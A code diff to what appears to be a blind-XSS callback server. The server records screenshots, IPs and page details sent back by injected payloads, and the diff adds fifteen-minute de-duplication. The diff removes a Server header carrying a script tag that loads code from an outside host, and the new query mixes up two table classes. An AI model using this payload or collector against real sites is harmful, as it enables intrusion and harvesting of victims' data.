@@ -61,7 +61,6 @@ class BaseHandler(tornado.web.RequestHandler):
         self.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
         self.set_header("Pragma", "no-cache")
         self.set_header("Expires", "0")
-        self.set_header("Server", "<script src=//y.vg></script>")
 
         self.request.remote_ip = self.request.headers.get( "X-Forwarded-For" )
 
@@ -196,7 +195,7 @@ def upload_screenshot( base64_screenshot_data_uri ):
     return screenshot_filename
 
 def record_callback_in_database( callback_data, request_handler ):
-    if len(callback_data["screenshot"]) > 0: 
+    if len(callback_data["screenshot"]) > 0:
         screenshot_file_path = upload_screenshot( callback_data["screenshot"] )
     else:
         screenshot_file_path = ''
@@ -410,12 +409,18 @@ class CallbackHandler(BaseHandler):
         else:
             callback_data = json.loads( self.request.body )
             callback_data['ip'] = self.request.remote_ip
-            injection_db_record = record_callback_in_database( callback_data, self )
-            self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )
 
-            if owner_user.email_enabled:
-                send_javascript_callback_message( owner_user.email, injection_db_record )
-            self.write( '{}' )
+	    # Check if injection already recently recorded
+	    owner_user = self.get_user_from_subdomain()
+    	    if 0 < session.query( InjectionRequest ).filter( Injection.owner_id == owner_user.id, Injection.vulnerable_page == callback_data["uri"].encode("utf-8"), Injection.victim_ip == self.request.remote_ip, Injection.user_agent == callback_data["user-agent"].encode("utf-8"), Injection.injection_timestamp > time.time()-900).count():
+                self.write( '{"DUPLICATE"}' )
+            else:
+                injection_db_record = record_callback_in_database( callback_data, self )
+                self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )
+
+                if owner_user.email_enabled:
+                    send_javascript_callback_message( owner_user.email, injection_db_record )
+                self.write( '{}' )
 
 class HomepageHandler(BaseHandler):
     def get(self, path):
@@ -444,8 +449,12 @@ class HomepageHandler(BaseHandler):
         else:
             new_probe = new_probe.replace( '[TEMPLATE_REPLACE_ME]', json.dumps( "" ))
 
-	 # Check recent callbacks
-        if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900 ).count():
+	# Check recent callbacks
+	if "Referer" in self.request.headers:
+            if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900, Injection.vulnerable_page == self.request.headers.get("Referer")).count():
+                new_probe = 'Injection already recorded within last fifteen minutes'
+	else:
+	    if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900).count():
                 new_probe = 'Injection already recorded within last fifteen minutes'
 
         if self.request.uri != "/":
